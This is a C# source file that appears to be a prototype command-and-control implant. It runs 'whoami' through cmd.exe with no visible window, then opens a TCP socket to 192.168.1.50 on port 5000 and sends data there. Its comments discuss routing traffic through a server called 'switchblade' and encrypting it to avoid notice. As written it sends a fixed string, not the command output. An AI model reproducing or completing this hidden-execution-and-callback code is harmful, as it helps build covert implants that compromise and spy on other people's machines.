using System;
using System.Net;
using System.Net.Security;
using System.Net.Http;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Security.Authentication;
using System.Text;
// https://qawithexperts.com/article/c-sharp/run-cmd-commands-using-c/520
// https://stackoverflow.com/a/27326758/9329272
//
namespace Testing
{
    public class Program
    {
        static readonly HttpClient client = new HttpClient();
        static void Main()
        {
            string command = "whoami";
			
            var whoami = ExecuteMe(command);

            Console.WriteLine(whoami);

            Socks("192.168.1.50", whoami);

        }
        public static string Socks(string host, string whoami)
        // This works!!!
        // This allows us to send a GET to a webpage through a socket
        // We need to now put a reverse proxy infront of switchblade so that we can route non-https traffic to https
        // But over http, this works fine. But doesn't work with sslcontext=adhoc
        // we need to transition away from webpages and use encryped sockets to manage this
        // ooooorrrrrrrrrrr we'll just public key encrypt the data
        {
            // Setup the socket
            Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            s.Connect(host, 5000);

            // Construct the request string
            string request = "whoami";
            byte[] requestBytes = Encoding.ASCII.GetBytes(request);

            // Send the request
            s.Send(requestBytes, requestBytes.Length, 0);

            // Receive the response
            byte[] responseBytes = new byte[4096];
            int bytesReceived = s.Receive(responseBytes, responseBytes.Length, 0);
            string response = Encoding.ASCII.GetString(responseBytes, 0, bytesReceived);
            return response;
        }
        static string ExecuteMe(string command){
            System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + command);
			procStartInfo.RedirectStandardOutput = true;
            procStartInfo.UseShellExecute = false;
            // Do not create the black window.
            procStartInfo.CreateNoWindow = true;
            // Now we create a process, assign its ProcessStartInfo and start it
            System.Diagnostics.Process proc = new System.Diagnostics.Process();
            proc.StartInfo = procStartInfo;
            proc.Start();

            // Get the output into a string
            string ressy = proc.StandardOutput.ReadToEnd();
            return ressy;
        }
    }
}